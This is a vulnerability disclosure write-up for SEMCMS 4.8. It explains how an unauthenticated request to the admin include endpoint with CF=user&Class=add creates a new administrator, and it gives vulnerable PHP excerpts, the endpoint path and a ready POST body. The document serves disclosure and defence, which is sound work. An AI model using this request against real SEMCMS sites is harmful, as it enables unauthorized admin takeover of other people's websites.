# Sem CMS 4.8 Unauthenticated User Gains Admin Privilege


Introduction to Semcms

SEMCMS is a foreign trade website content management system (CMS) that supports multiple languages.

v4.8 Download Link: http://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip
Causes of vulnerabilities:

/6EeOq0_Admin/Top_include.php

Vulnerable Code Blocks:

```
<?php
include_once './Include/inc.php';
include_once 'SEMCMS_Function.php';
$SCQuanXian=checkuser($db_conn);
?>
```

One can observe that the code installs SEMCMS_Funtion.php before checking if the admin is a valid user in the admin page because authentication funnction is called from there.

Below you can observe the authentication check function which starts at line 984 and ends at line 1013

```
}elseif($CF=="users"){  
 
   if($Class=="login"){ //登陆   
       
       $US=test_input($_POST['UserName']);
       $PS=test_input($_POST['UserPass']);
     
        if(empty($US) || empty($PS)){

                 echo "<script language='javascript'>alert('账号或密码不能为空!');top.location.href='index.html';</script>";

        }else{

                $PS=md5($PS);
                $query=$db_conn->query("select * from sc_user where user_admin='$US' and user_ps='$PS'");
                if (mysqli_num_rows($query)>0 ){

                      $row=mysqli_fetch_assoc($query);

                      setcookie("scusername", $row['user_name'],time()+3600*24,"/");
                      setcookie("scuseradmin", $row['user_admin'],time()+3600*24,"/");
                      setcookie("scuserpass", $row['user_ps'],time()+3600*24,"/");//设定时间为24个小时
                      header("Location:SEMCMS_Main.php");  

                  }else{

                       echo "<script language='javascript'>alert('账号或密码错误!');top.location.href='index.html';</script>";

                   }
        }
```



If we look further in 'SEMCMS_Funtion.php' to check what are the avaliable functions, the code snippet below found at 782 which is used to add or modify an admin:

```
elseif ($CF=="user"){

         $table="sc_user";

        if($Class=="add" || $Class=="edit"){ //信息添加

           $user_name=test_input($_POST['user_name']);
           $user_admin=test_input($_POST['user_admin']);
           $user_ps=  test_input($_POST['user_ps']);
           $user_tel=test_input($_POST['user_tel']);
           $user_email=test_input($_POST['user_email']);
           $field="user_name,user_admin,user_ps,user_tel,user_email";
           $val=array($user_name,$user_admin,$user_ps,$user_tel,$user_email); 

        }

        switch ($Class) {

          case 'add':

            if(empty($user_name) || empty($user_admin) || empty($user_ps) || empty($user_email)  ){  //判断空字段 

               header("Location:SEMCMS_User.php?type=add&err=003"); 

             }else{  //写入数据库
                
              $Ant->AntAdd($table,$field,$val,$db_conn); //写入数据库 
              header("Location: SEMCMS_User.php?lgid=".$languageID."&err=001");     
                
            }

            break;
```

When we visit the page http://url/6EeOq0_Admin/index.html  the application installs the login form. When we send a dumb login request we see that the credentials are posted to the end-point "/6EeOq0_Admin/SEMCMS_Top_include.php?CF=users&Class=login HTTP/1.1"

![image](https://github.com/turabiaslan/semcms/assets/32524544/5db25ff0-a3e0-40b5-a54a-053e54c4166a)

Observe the parameters: CF=users and Class=login. So The application calls SEMCMS_Top_include.php and then that page calls SEMCMS_Funtion.php. Let's send this request to Burp Suite's Repater.


If we change CF parameter to 'user' and Class parameter to 'add' like as shown in the last code snippet, we should be able to send an admin adding request to the "/6EeOq0_Admin/SEMCMS_Top_include.php?CF=user&Class=add" end-point.



There are five parameters present in the body of the request; user_name, user_admin, user_ps, user_tel, user_email. When we add this parameters to the request and supply values them respectively, we should be able to add an admin user without authenticating the application.
Below you can find the payload. user_ps value is the MD5 hash of string 1.

```
user_name=turabi&user_admin=Turabi&user_ps=c4ca4238a0b923820dcc509a6f75849b&user_tel=b&user_email=turabi@beam.com
```

![image](https://github.com/turabiaslan/semcms/assets/32524544/08a9bdf2-00f0-484e-bb7f-7f6ca7f44a31)



Let's try the new user on the application:

![image](https://github.com/turabiaslan/semcms/assets/32524544/4961d962-4728-429a-a641-d021a79ae590)


We successfully login to our newly added 

![image](https://github.com/turabiaslan/semcms/assets/32524544/87330e72-c1d8-4a14-b3c2-6e786cc212f4)
